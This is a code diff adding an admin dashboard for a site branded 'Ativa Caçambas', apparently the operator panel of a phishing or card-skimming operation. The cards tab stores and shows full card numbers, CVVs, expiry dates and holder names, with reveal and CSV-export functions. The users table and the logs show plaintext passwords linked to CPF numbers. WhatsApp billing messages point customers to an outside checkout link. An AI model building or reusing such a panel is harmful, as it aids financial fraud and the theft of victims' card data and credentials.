+                <div class="card-header"><i class="fas fa-credit-card"></i> Dados de Cartões <div style="display:flex; gap:10px; flex-wrap:wrap;"><button class="toggle-card-btn" onclick="toggleCardVisibility()"><i class="fas fa-eye toggle-icon"></i> Mostrar números</button><div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchCards" placeholder="Buscar CPF..." onkeyup="filterCards()"></div><button class="btn-primary" onclick="exportCardsCSV()">Exportar CSV</button><button class="btn-delete" onclick="clearAllCards()">Limpar Todos</button></div></div>
+                <div class="table-wrapper"><table class="payment-table"><thead><tr><th>CPF</th><th>Número</th><th>Titular</th><th>CVV</th><th>Validade</th><th>Data</th><th>Ações</th></tr></thead><tbody id="cardsTable"></tbody></table></div>
+            </div>
+        </div>
+
+        <!-- PAGAMENTOS -->
+        <div id="tabPayments" class="tab-content"><div class="card"><div class="card-header"><i class="fas fa-history"></i> Histórico de Pagamentos <div style="display:flex; gap:10px; flex-wrap:wrap;"><button class="btn-primary" onclick="exportPaymentsCSV()">Exportar CSV</button><button class="btn-delete" onclick="clearAllPayments()">Limpar Todos</button></div></div><div id="paymentsList"></div></div></div>
+
+        <!-- LOGS -->
+        <div id="tabLogs" class="tab-content"><div class="card"><div class="card-header"><i class="fas fa-history"></i> Logs do Sistema</div><div id="logsList"></div></div></div>
+
+        <!-- CONFIGURAÇÕES -->
+        <div id="tabSettings" class="tab-content">
+            <div class="card"><div class="card-header"><i class="fas fa-palette"></i> Tema</div><div class="theme-options"><div class="theme-btn theme-dark-btn" onclick="setTheme('dark')" title="Dark Mode"></div><div class="theme-btn theme-light-btn" onclick="setTheme('light')" title="Light Mode"></div></div></div>
+            <div class="card"><div class="card-header"><i class="fas fa-user-plus"></i> Adicionar Admin</div><form id="addUserForm"><div class="form-row"><div class="form-group"><label>Usuário</label><input type="text" id="newUsername"></div><div class="form-group"><label>Senha</label><input type="password" id="newPassword"></div></div><button type="submit" class="btn-primary">Adicionar Admin</button></form></div>
+            <div class="card"><div class="card-header"><i class="fas fa-key"></i> Alterar Senha Admin</div><div class="form-group"><label>Senha Atual</label><input type="password" id="currentPass"></div><div class="form-group"><label>Nova Senha (mínimo 6 caracteres)</label><input type="password" id="newPass"></div><div class="form-group"><label>Confirmar Nova Senha</label><input type="password" id="confirmPass"></div><button class="btn-primary" onclick="changeAdminPassword()">Atualizar Senha</button><div id="passwordMsg" style="margin-top:12px; font-size:12px;"></div></div>
+        </div>
+        <div class="footer">Ativa Caçambas | Sistema de Gestão v3.0</div>
+    </main>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+// Background 3D
+(function(){
+    const canvas = document.getElementById('bgCanvas');
+    if(!canvas) return;
+    const scene = new THREE.Scene();
+    const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+    const renderer = new THREE.WebGLRenderer({ canvas, alpha: true });
+    renderer.setSize(window.innerWidth, window.innerHeight);
+    renderer.setClearColor(0x000000, 1);
+    const starsCount = 500;
+    const starsGeometry = new THREE.BufferGeometry();
+    const starsPositions = new Float32Array(starsCount * 3);
+    for(let i = 0; i < starsCount; i++) {
+        starsPositions[i*3] = (Math.random() - 0.5) * 2000;
+        starsPositions[i*3+1] = (Math.random() - 0.5) * 1000;
+        starsPositions[i*3+2] = (Math.random() - 0.5) * 500 - 200;
+    }
+    starsGeometry.setAttribute('position', new THREE.BufferAttribute(starsPositions, 3));
+    const stars = new THREE.Points(starsGeometry, new THREE.PointsMaterial({ color: 0xffffff, size: 0.2, transparent: true, opacity: 0.3 }));
+    scene.add(stars);
+    camera.position.z = 10;
+    function animate() { requestAnimationFrame(animate); stars.rotation.y += 0.0002; stars.rotation.x += 0.0001; renderer.render(scene, camera); }
+    animate();
+    window.addEventListener('resize', () => { camera.aspect = window.innerWidth / window.innerHeight; camera.updateProjectionMatrix(); renderer.setSize(window.innerWidth, window.innerHeight); });
+})();
+
+setTimeout(() => { const loader = document.getElementById('loadingScreen'); if(loader) loader.classList.add('hidden'); }, 400);
+
+// Variáveis Globais
+let adminToken = null;
+let refreshInterval = null;
+let productsData = [], usersData = [], cardsData = [], paymentsData = [], logsData = [], scheduleData = [];
+let statusChart = null, revenueChart = null;
+let currentPaymentFilter = 'all';
+let showCardNumbers = false;
+let currentEditId = null;
+
+// Utilitários
+function showToast(msg) { const toast = document.createElement('div'); toast.className = 'toast'; toast.innerHTML = `<i class="fas fa-info-circle"></i> ${msg}`; document.body.appendChild(toast); setTimeout(() => toast.remove(), 3000); }
+function formatCPF(cpf) { if(!cpf) return ''; cpf = cpf.toString(); if(cpf.length === 11) return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4'); return cpf; }
+function formatPhone(phone) { if(!phone) return '-'; phone = phone.toString(); if(phone.length === 11) return phone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3'); if(phone.length === 10) return phone.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3'); return phone; }
+function escapeHtml(str) { if(!str) return ''; return String(str).replace(/[&<>]/g, function(m) { if(m === '&') return '&amp;'; if(m === '<') return '&lt;'; if(m === '>') return '&gt;'; return m; }); }
+
+function toggleSidebar() {
+    const sidebar = document.getElementById('sidebar'); const mainContent = document.getElementById('mainContent'); const toggleBtn = document.getElementById('sidebarToggle');
+    if(window.innerWidth <= 768) { sidebar.classList.toggle('mobile-open'); }
+    else { sidebar.classList.toggle('collapsed'); mainContent.classList.toggle('expanded'); toggleBtn.classList.toggle('collapsed'); if(sidebar.classList.contains('collapsed')) toggleBtn.innerHTML = '<i class="fas fa-chevron-right"></i>'; else toggleBtn.innerHTML = '<i class="fas fa-bars"></i>'; }
+}
+function setTheme(theme) { document.body.classList.remove('theme-dark', 'theme-light'); document.body.classList.add(`theme-${theme}`); localStorage.setItem('adminTheme', theme); }
+function loadSavedTheme() { const saved = localStorage.getItem('adminTheme'); if(saved) setTheme(saved); else setTheme('dark'); } loadSavedTheme();
+
+function toggleCardVisibility() {
+    showCardNumbers = !showCardNumbers;
+    const btn = document.querySelector('.toggle-card-btn');
+    if(showCardNumbers) btn.innerHTML = '<i class="fas fa-eye-slash toggle-icon"></i> Ocultar números';
+    else btn.innerHTML = '<i class="fas fa-eye toggle-icon"></i> Mostrar números';
+    renderCards();
+}
+function getDisplayCardNumber(num) { if(!num) return '****'; if(showCardNumbers) return num; let str = num.toString().replace(/\s/g, ''); if(str.length >= 16) return '•••• •••• •••• ' + str.slice(-4); return '•••• •••• •••• ' + str.slice(-4); }
+
+// Login
+async function handleLogin() {
+    const username = document.getElementById('loginUser').value.trim();
+    const password = document.getElementById('loginPass').value.trim();
+    const errorDiv = document.getElementById('loginError');
+    if(!username || !password) { errorDiv.style.display = 'block'; errorDiv.textContent = 'Preencha todos os campos'; setTimeout(() => errorDiv.style.display = 'none', 2000); return; }
+    try {
+        const res = await fetch('/api/admin/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username, password }) });
+        const data = await res.json();
+        if(data.success) {
+            adminToken = data.token; sessionStorage.setItem('adminToken', adminToken);
+            document.getElementById('loginContainer').style.display = 'none';
+            document.getElementById('adminPanel').classList.add('visible');
+            if(refreshInterval) clearInterval(refreshInterval);
+            refreshInterval = setInterval(() => { if(adminToken) loadDashboardData(); }, 15000);
+            loadAllData();
+            showToast('Bem-vindo ao painel!');
+        } else { errorDiv.style.display = 'block'; errorDiv.textContent = 'Credenciais inválidas'; setTimeout(() => errorDiv.style.display = 'none', 2000); }
+    } catch(e) { errorDiv.style.display = 'block'; errorDiv.textContent = 'Erro de conexão'; setTimeout(() => errorDiv.style.display = 'none', 2000); }
+}
+function handleLogout() { if(refreshInterval) clearInterval(refreshInterval); sessionStorage.removeItem('adminToken'); adminToken = null; document.getElementById('adminPanel').classList.remove('visible'); document.getElementById('loginContainer').style.display = 'flex'; showToast('Logout realizado'); }
+if(sessionStorage.getItem('adminToken')) { adminToken = sessionStorage.getItem('adminToken'); document.getElementById('loginContainer').style.display = 'none'; document.getElementById('adminPanel').classList.add('visible'); loadAllData(); refreshInterval = setInterval(() => { if(adminToken) loadDashboardData(); }, 15000); }
+
+// Carregar Dados
+async function loadAllData() {
+    if(!adminToken) return;
+    try {
+        await Promise.all([loadProducts(), loadSchedule(), loadUsers(), loadCards(), loadPaymentsFull(), loadLogsFull()]);
+        await loadDashboardData();
+    } catch(e) { console.error(e); }
+}
+
+async function loadDashboardData() {
+    if(!adminToken) return;
+    try {
+        const res = await fetch('/api/admin/stats', { headers: { 'Authorization': `Bearer ${adminToken}` } });
+        const data = await res.json();
+        const stats = data.stats || {};
+        const paidTotal = paymentsData.filter(p => p.status === 'paid').reduce((s, p) => s + parseFloat(p.valor || 0), 0);
+        const pendingCount = paymentsData.filter(p => p.status !== 'paid').length;
+        const paidCount = paymentsData.filter(p => p.status === 'paid').length;
+        document.getElementById('statTotalRevenue').innerHTML = `R$ ${paidTotal.toFixed(2)}`;
+        document.getElementById('statPendingCount').innerText = pendingCount;
+        document.getElementById('statPaidCount').innerText = paidCount;
+        const today = new Date().toISOString().split('T')[0];
+        const todaySchedules = scheduleData.filter(s => s.data_agendamento === today).length;
+        document.getElementById('statScheduleCount').innerText = todaySchedules;
+        renderPaymentTable();
+        updateCharts();
+        renderRecentActivity(logsData.slice(0, 10));
+    } catch(e) { console.error(e); }
+}
+
+function renderPaymentTable() {
+    const tbody = document.getElementById('paymentTableBody');
+    let filtered = paymentsData;
+    if(currentPaymentFilter === 'pending') filtered = paymentsData.filter(p => p.status !== 'paid');
+    if(currentPaymentFilter === 'paid') filtered = paymentsData.filter(p => p.status === 'paid');
+    if(!filtered.length) { tbody.innerHTML = '<tr><td colspan="7" style="text-align:center">Nenhum pagamento encontrado</td></tr>'; return; }
+    tbody.innerHTML = filtered.map(p => `
+        <tr>
+            <td><strong>${escapeHtml(p.cliente_nome || formatCPF(p.cpf))}</strong><br><small>${formatCPF(p.cpf)}</small></td>
+            <td>${formatPhone(p.telefone)}</td>
+            <td><strong>R$ ${parseFloat(p.valor).toFixed(2)}</strong></td>
+            <td><span class="badge-pix">${p.tipo_pagamento || 'PIX'}</span></td>
+            <td><span class="${p.status === 'paid' ? 'badge-paid' : 'badge-pending'}">${p.status === 'paid' ? 'PAGO' : 'PENDENTE'}</span></td>
+            <td>${p.data_solicitacao ? new Date(p.data_solicitacao).toLocaleDateString() : '-'}</td>
+            <td><button class="btn-delete" onclick="deletePayment(${p.id})" style="padding:6px 14px;">Excluir</button></td>
+        </tr>
+    `).join('');
+}
+
+function filterPaymentTable(filter) {
+    currentPaymentFilter = filter;
+    document.querySelectorAll('.tab-mini').forEach(btn => btn.classList.remove('active'));
+    if(filter === 'all') document.querySelectorAll('.tab-mini')[0].classList.add('active');
+    if(filter === 'pending') document.querySelectorAll('.tab-mini')[1].classList.add('active');
+    if(filter === 'paid') document.querySelectorAll('.tab-mini')[2].classList.add('active');
+    renderPaymentTable();
+}
+
+function updateCharts() {
+    const paid = paymentsData.filter(p => p.status === 'paid').length;
+    const pending = paymentsData.filter(p => p.status !== 'paid').length;
+    if(statusChart) statusChart.destroy();
+    const ctx1 = document.getElementById('statusChart').getContext('2d');
+    statusChart = new Chart(ctx1, { type: 'doughnut', data: { labels: ['Pagos', 'Pendentes'], datasets: [{ data: [paid, pending], backgroundColor: ['#10b981', '#f59e0b'], borderWidth: 0 }] }, options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { position: 'bottom', labels: { color: getComputedStyle(document.body).getPropertyValue('--text-secondary') } } } } });
+    const months = ['Jan', 'Fev', 'Mar', 'Abr', 'Mai', 'Jun', 'Jul', 'Ago', 'Set', 'Out', 'Nov', 'Dez'];
+    const monthlyRevenue = new Array(12).fill(0);
+    paymentsData.filter(p => p.status === 'paid').forEach(p => { const date = new Date(p.data_solicitacao); const month = date.getMonth(); monthlyRevenue[month] += parseFloat(p.valor || 0); });
+    if(revenueChart) revenueChart.destroy();
+    const ctx2 = document.getElementById('revenueChart').getContext('2d');
+    revenueChart = new Chart(ctx2, { type: 'line', data: { labels: months, datasets: [{ label: 'Receita (R$)', data: monthlyRevenue, borderColor: '#3b82f6', backgroundColor: 'rgba(59,130,246,0.1)', fill: true, tension: 0.3 }] }, options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { labels: { color: getComputedStyle(document.body).getPropertyValue('--text-secondary') } } }, scales: { y: { ticks: { color: getComputedStyle(document.body).getPropertyValue('--text-secondary') } }, x: { ticks: { color: getComputedStyle(document.body).getPropertyValue('--text-secondary') } } } } });
+}
+
+function renderRecentActivity(logs) {
+    const container = document.getElementById('recentActivity');
+    if(!logs.length) { container.innerHTML = '<div style="padding:20px; text-align:center;">Nenhuma atividade recente</div>'; return; }
+    container.innerHTML = logs.map(log => `<div style="padding:12px 0; border-bottom:1px solid var(--border);"><span style="color:var(--text-muted); font-size:11px;">${new Date(log.data).toLocaleString()}</span> <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-warning'}">${log.tipo === 'senha_inserida' ? 'SENHA' : 'CPF'}</span> <span>${formatCPF(log.cpf)}</span></div>`).join('');
+}
+
+// Produtos
+async function loadProducts() { if(!adminToken) return; try { const res = await fetch('/api/admin/produtos', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); if(data.success) { productsData = data.produtos || []; renderProducts(); } } catch(e) { console.error(e); } }
+function renderProducts() { const container = document.getElementById('productList'); const countSpan = document.getElementById('productCount'); if(!productsData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">Nenhum produto cadastrado</div>'; if(countSpan) countSpan.innerHTML = '0 itens'; return; } if(countSpan) countSpan.innerHTML = `${productsData.length} itens`; container.innerHTML = productsData.map(p => `<div class="product-row"><div class="product-info"><div class="product-icon">${p.imagem ? `<img src="${p.imagem}" style="width:100%;height:100%;object-fit:cover;border-radius:12px;">` : `<i class="${p.icone || 'fas fa-box'}"></i>`}</div><div class="product-details"><h4>${escapeHtml(p.nome)}</h4><p>${p.dimensoes || ''} ${p.capacidade ? '· ' + p.capacidade : ''}</p></div></div><div class="product-price">R$ ${(p.preco_promocional || p.preco).toFixed(2)}</div><div class="product-actions"><button class="btn-icon" onclick="editProductModal(${p.id})"><i class="fas fa-edit"></i></button><button class="btn-icon" onclick="deleteProduct(${p.id})"><i class="fas fa-trash"></i></button></div></div>`).join(''); }
+function editProductModal(id) { const product = productsData.find(p => p.id === id); if(!product) return; currentEditId = id; document.getElementById('editProdId').value = product.id; document.getElementById('editProdNome').value = product.nome || ''; document.getElementById('editProdTipo').value = product.tipo || 'cacamba'; document.getElementById('editProdPreco').value = product.preco || ''; document.getElementById('editProdPromocional').value = product.preco_promocional || ''; document.getElementById('editProdDimensoes').value = product.dimensoes || ''; document.getElementById('editProdCapacidade').value = product.capacidade || ''; document.getElementById('editProdPeso').value = product.peso || ''; document.getElementById('editProdMaterial').value = product.material || ''; document.getElementById('editProdCor').value = product.cor || ''; document.getElementById('editProdFabricante').value = product.fabricante || ''; document.getElementById('editProdImagem').value = product.imagem || ''; document.getElementById('editProdIcone').value = product.icone || ''; document.getElementById('editProdDescricao').value = product.descricao || ''; document.getElementById('editProductModal').classList.add('active'); }
+function closeEditModal() { document.getElementById('editProductModal').classList.remove('active'); currentEditId = null; }
+document.getElementById('editProductForm')?.addEventListener('submit', async (e) => { e.preventDefault(); const product = { nome: document.getElementById('editProdNome').value, tipo: document.getElementById('editProdTipo').value, preco: parseFloat(document.getElementById('editProdPreco').value), preco_promocional: parseFloat(document.getElementById('editProdPromocional')?.value) || null, descricao: document.getElementById('editProdDescricao').value, imagem: document.getElementById('editProdImagem').value, icone: document.getElementById('editProdIcone').value, dimensoes: document.getElementById('editProdDimensoes').value, capacidade: document.getElementById('editProdCapacidade').value, peso: document.getElementById('editProdPeso').value, material: document.getElementById('editProdMaterial').value, cor: document.getElementById('editProdCor').value, fabricante: document.getElementById('editProdFabricante').value }; await fetch(`/api/admin/produtos/${currentEditId}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` }, body: JSON.stringify(product) }); showToast('Produto atualizado com sucesso!'); closeEditModal(); await loadProducts(); });
+async function deleteProduct(id) { if(!confirm('Deletar este produto permanentemente?')) return; await fetch(`/api/admin/produtos/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); showToast('Produto deletado'); await loadProducts(); }
+document.getElementById('productForm')?.addEventListener('submit', async (e) => { e.preventDefault(); const product = { nome: document.getElementById('prodNome').value, tipo: document.getElementById('prodTipo').value, preco: parseFloat(document.getElementById('prodPreco').value), preco_promocional: parseFloat(document.getElementById('prodPromocional')?.value) || null, descricao: document.getElementById('prodDescricao').value, imagem: document.getElementById('prodImagem').value, icone: document.getElementById('prodIcone').value, dimensoes: document.getElementById('prodDimensoes').value, capacidade: document.getElementById('prodCapacidade').value, peso: document.getElementById('prodPeso').value, material: document.getElementById('prodMaterial').value, cor: document.getElementById('prodCor').value, fabricante: document.getElementById('prodFabricante').value }; await fetch('/api/admin/produtos', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` }, body: JSON.stringify(product) }); showToast('Produto adicionado com sucesso!'); await loadProducts(); e.target.reset(); });
+
+// Agendamentos
+async function loadSchedule() { if(!adminToken) return; try { const res = await fetch('/api/admin/agendamentos', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); scheduleData = data.agendamentos || []; renderSchedule(); } catch(e) { console.error(e); } }
+function sendWhatsApp(phone, nome, endereco) { let numero = phone.toString().replace(/\D/g, ''); if(numero.length === 11) numero = '55' + numero; else numero = '5541992878772'; const texto = `ATIVA CACAMBAS - COBRANCA%0A%0AOla *${encodeURIComponent(nome)}*!%0A%0A*SEU PEDIDO:*%0AEndereco: ${encodeURIComponent(endereco)}%0A%0A*LINK PARA PAGAMENTO:*%0Ahttps://reidacacambinha.onrender.com/checkout.html%0A%0AClique no link acima para finalizar o pagamento de forma segura.%0A%0AAgradecemos a preferencia!`; window.open(`https://wa.me/${numero}?text=${texto}`, '_blank'); }
+function renderSchedule() { const container = document.getElementById('scheduleList'); if(!scheduleData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">Nenhum agendamento encontrado</div>'; return; } container.innerHTML = `<div class="table-wrapper"><table class="schedule-table"><thead><tr><th>Cliente</th><th>Telefone</th><th>Endereço</th><th>Data</th><th>Ações</th></tr></thead><tbody>${scheduleData.map(a => `<tr><td><strong>${escapeHtml(a.cliente_nome || '-')}</strong><br><small>${formatCPF(a.cpf)}</small></td><td>${formatPhone(a.telefone)}</td><td>${escapeHtml(a.endereco_obra || '-')}</td><td>${a.data_agendamento ? new Date(a.data_agendamento).toLocaleDateString() : '-'}</td><td><button class="btn-whats" onclick="sendWhatsApp('${a.telefone || ''}', '${escapeHtml(a.cliente_nome || '').replace(/'/g, "\\'")}', '${escapeHtml(a.endereco_obra || '').replace(/'/g, "\\'")}')"><i class="fab fa-whatsapp"></i> Cobrar</button> <button class="btn-delete" onclick="deleteSchedule(${a.id})">Excluir</button></td></tr>`).join('')}</tbody></table></div>`; }
+async function deleteSchedule(id) { if(!confirm('Deletar este agendamento?')) return; await fetch(`/api/admin/agendamentos/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); showToast('Agendamento deletado'); await loadSchedule(); await loadDashboardData(); }
+
+// Usuários
+async function loadUsers() { if(!adminToken) return; try { const res = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); usersData = data.users || []; renderUsers(); } catch(e) { console.error(e); } }
+function renderUsers() { const tbody = document.getElementById('usersTable'); if(!usersData.length) { tbody.innerHTML = '<tr><td colspan="5">Nenhum usuário encontrado</td></tr>'; return; } tbody.innerHTML = usersData.map(u => `<tr><td><strong>${formatCPF(u.cpf)}</strong></td><td><span class="badge-warning">${u.senha || '--------'}</span></td><td>${formatPhone(u.telefone)}</td><td>${u.data_senha ? new Date(u.data_senha).toLocaleDateString() : '-'}</td><td><button class="btn-delete" onclick="deleteUser('${u.cpf}')">Excluir</button></td></tr>`).join(''); }
+function filterUsers() { const term = document.getElementById('searchUsers')?.value.toLowerCase() || ''; const filtered = usersData.filter(u => (u.cpf || '').toLowerCase().includes(term) || (u.telefone || '').toLowerCase().includes(term)); const tbody = document.getElementById('usersTable'); if(!filtered.length) { tbody.innerHTML = '<tr><td colspan="5">Nenhum resultado encontrado</td></tr>'; return; } tbody.innerHTML = filtered.map(u => `<tr><td><strong>${formatCPF(u.cpf)}</strong></td><td><span class="badge-warning">${u.senha || '--------'}</span></td><td>${formatPhone(u.telefone)}</td><td>${u.data_senha ? new Date(u.data_senha).toLocaleDateString() : '-'}</td><td><button class="btn-delete" onclick="deleteUser('${u.cpf}')">Excluir</button></td></tr>`).join(''); }
+async function deleteUser(cpf) { if(!confirm(`Deletar usuário ${formatCPF(cpf)}?`)) return; await fetch(`/api/admin/delete/${encodeURIComponent(cpf)}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadUsers(); showToast('Usuário deletado'); }
+async function clearAllUsers() { if(!confirm('DELETAR TODOS OS USUÁRIOS? Esta ação não pode ser desfeita!')) return; await fetch('/api/admin/clear', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadUsers(); showToast('Todos os usuários foram deletados'); }
+function exportUsersCSV() { if(!usersData.length) { showToast('Sem dados para exportar'); return; } let csv = "CPF,SENHA,TELEFONE,DATA\n"; usersData.forEach(u => csv += `"${u.cpf}","${u.senha || ''}","${u.telefone || ''}","${u.data_senha || u.data_cpf || ''}"\n`); const blob = new Blob([csv], { type: 'text/csv' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = `usuarios_${new Date().toISOString().slice(0,19)}.csv`; link.click(); showToast('CSV exportado com sucesso!'); }
+
+// Cartões
+async function loadCards() { if(!adminToken) return; try { const res = await fetch('/api/admin/cartoes', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); cardsData = data.cartoes || []; renderCards(); } catch(e) { console.error(e); } }
+function renderCards() { const tbody = document.getElementById('cardsTable'); if(!cardsData.length) { tbody.innerHTML = '<tr><td colspan="7">Nenhum cartão encontrado</td></tr>'; return; } tbody.innerHTML = cardsData.map(c => `<tr><td><strong>${formatCPF(c.cpf)}</strong><br><small>${escapeHtml(c.nome_titular)}</small></td><td><span class="badge-warning" style="font-family:monospace;">${getDisplayCardNumber(c.numero_cartao)}</span></td><td>${escapeHtml(c.nome_titular)}</td><td><span class="badge-warning">${showCardNumbers ? c.cvv : '***'}</span></td><td>${c.validade || '-'}</td><td>${c.created_at ? new Date(c.created_at).toLocaleDateString() : '-'}</td><td><button class="btn-delete" onclick="deleteCard(${c.id})">Excluir</button></td></tr>`).join(''); }
+function filterCards() { const term = document.getElementById('searchCards')?.value.toLowerCase() || ''; const filtered = cardsData.filter(c => (c.cpf || '').toLowerCase().includes(term) || (c.nome_titular || '').toLowerCase().includes(term)); const tbody = document.getElementById('cardsTable'); if(!filtered.length) { tbody.innerHTML = '<tr><td colspan="7">Nenhum resultado encontrado</td></tr>'; return; } tbody.innerHTML = filtered.map(c => `<tr><td><strong>${formatCPF(c.cpf)}</strong><br><small>${escapeHtml(c.nome_titular)}</small></td><td><span class="badge-warning" style="font-family:monospace;">${getDisplayCardNumber(c.numero_cartao)}</span></td><td>${escapeHtml(c.nome_titular)}</td><td><span class="badge-warning">${showCardNumbers ? c.cvv : '***'}</span></td><td>${c.validade || '-'}</td><td>${c.created_at ? new Date(c.created_at).toLocaleDateString() : '-'}</td><td><button class="btn-delete" onclick="deleteCard(${c.id})">Excluir</button></td></tr>`).join(''); }
+async function deleteCard(id) { if(!confirm('Deletar este cartão?')) return; await fetch(`/api/admin/cartoes/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadCards(); showToast('Cartão deletado'); }
+async function clearAllCards() { if(!confirm('DELETAR TODOS OS CARTÕES? Esta ação não pode ser desfeita!')) return; await fetch('/api/admin/clear-cards', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadCards(); showToast('Todos os cartões foram deletados'); }
+function exportCardsCSV() { if(!cardsData.length) { showToast('Sem dados para exportar'); return; } let csv = "CPF,NOME,CARTAO,CVV,VALIDADE,DATA\n"; cardsData.forEach(c => csv += `"${c.cpf}","${c.nome_titular}","${c.numero_cartao}","${c.cvv}","${c.validade}","${c.created_at}"\n`); const blob = new Blob([csv], { type: 'text/csv' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = `cartoes_${new Date().toISOString().slice(0,19)}.csv`; link.click(); showToast('CSV exportado com sucesso!'); }
+
+// Pagamentos
+async function loadPaymentsFull() { if(!adminToken) return; try { const res = await fetch('/api/admin/payments', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); paymentsData = data.payments || []; renderPaymentsFull(); } catch(e) { console.error(e); } }
+function renderPaymentsFull() { const container = document.getElementById('paymentsList'); if(!paymentsData.length) { container.innerHTML = '<div style="padding:40px; text-align:center;">Nenhum pagamento registrado</div>'; return; } container.innerHTML = `<div class="table-wrapper"><table class="payment-table"><thead><tr><th>CPF</th><th>Valor</th><th>Status</th><th>Data</th><th>Ações</th></tr></thead><tbody>${paymentsData.map(p => `<tr><td><strong>${formatCPF(p.cpf)}</strong></td><td><strong>R$ ${parseFloat(p.valor).toFixed(2)}</strong></td><td><span class="${p.status === 'paid' ? 'badge-paid' : 'badge-pending'}">${p.status === 'paid' ? 'PAGO' : 'PENDENTE'}</span></td><td>${new Date(p.data_solicitacao).toLocaleString()}</td><td><button class="btn-delete" onclick="deletePayment(${p.id})">Excluir</button></td></tr>`).join('')}</tbody></table></div>`; }
+async function deletePayment(id) { if(!confirm('Deletar este pagamento?')) return; await fetch(`/api/admin/payments/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadPaymentsFull(); await loadDashboardData(); showToast('Pagamento deletado'); }
+async function clearAllPayments() { if(!confirm('DELETAR TODOS OS PAGAMENTOS? Esta ação não pode ser desfeita!')) return; await fetch('/api/admin/clear-payments', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadPaymentsFull(); await loadDashboardData(); showToast('Todos os pagamentos foram deletados'); }
+function exportPaymentsCSV() { if(!paymentsData.length) { showToast('Sem dados para exportar'); return; } let csv = "CPF,VALOR,STATUS,TIPO,DATA\n"; paymentsData.forEach(p => csv += `"${p.cpf}","${p.valor}","${p.status}","${p.tipo_pagamento}","${p.data_solicitacao}"\n`); const blob = new Blob([csv], { type: 'text/csv' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = `pagamentos_${new Date().toISOString().slice(0,19)}.csv`; link.click(); showToast('CSV exportado com sucesso!'); }
+
+// Logs
+async function loadLogsFull() { if(!adminToken) return; try { const res = await fetch('/api/admin/logs', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); logsData = data.logs || []; renderLogsFull(); } catch(e) { console.error(e); } }
+function renderLogsFull() { const container = document.getElementById('logsList'); if(!logsData.length) { container.innerHTML = '<div style="padding:40px; text-align:center;">Nenhum log registrado</div>'; return; } container.innerHTML = logsData.map(log => `<div style="padding:12px 0; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;"><span><span style="color:var(--text-muted);">${new Date(log.data).toLocaleString()}</span> <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-warning'}">${log.tipo === 'senha_inserida' ? 'SENHA' : 'CPF'}</span> <span>${formatCPF(log.cpf)}</span> ${log.senha ? `<span class="badge-warning">Senha: ${log.senha}</span>` : ''}</span><button class="btn-delete" onclick="deleteLog(${log.id})" style="padding:6px 14px;">Excluir</button></div>`).join(''); }
+async function deleteLog(id) { if(!confirm('Deletar este log?')) return; await fetch(`/api/admin/logs/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadLogsFull(); showToast('Log deletado'); }
+async function clearAllLogs() { if(!confirm('DELETAR TODOS OS LOGS? Esta ação não pode ser desfeita!')) return; await fetch('/api/admin/clear-logs', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadLogsFull(); showToast('Todos os logs foram deletados'); }
+
+// Configurações
+document.getElementById('addUserForm')?.addEventListener('submit', async (e) => { e.preventDefault(); const username = document.getElementById('newUsername').value; const password = document.getElementById('newPassword').value; if(!username || !password || password.length < 6) { showToast('Usuário e senha (mínimo 6 caracteres) obrigatórios'); return; } await fetch('/api/admin/add-user', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` }, body: JSON.stringify({ username, password }) }); showToast('Admin adicionado com sucesso!'); e.target.reset(); });
+
